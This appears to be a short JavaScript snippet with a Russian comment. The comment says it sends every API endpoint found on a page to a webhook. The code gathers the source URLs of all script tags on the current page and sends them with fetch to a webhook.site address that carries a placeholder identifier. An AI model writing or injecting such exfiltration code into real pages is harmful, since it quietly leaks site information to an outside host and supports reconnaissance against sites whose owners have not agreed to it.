// Этот скрипт отправит на webhook все найденные API endpoints
const scripts = document.querySelectorAll('script');
let sources = '';
scripts.forEach(script => sources += script.src + '\n');
fetch('https://webhook.site/твой-uuid?scan=' + encodeURIComponent(sources));
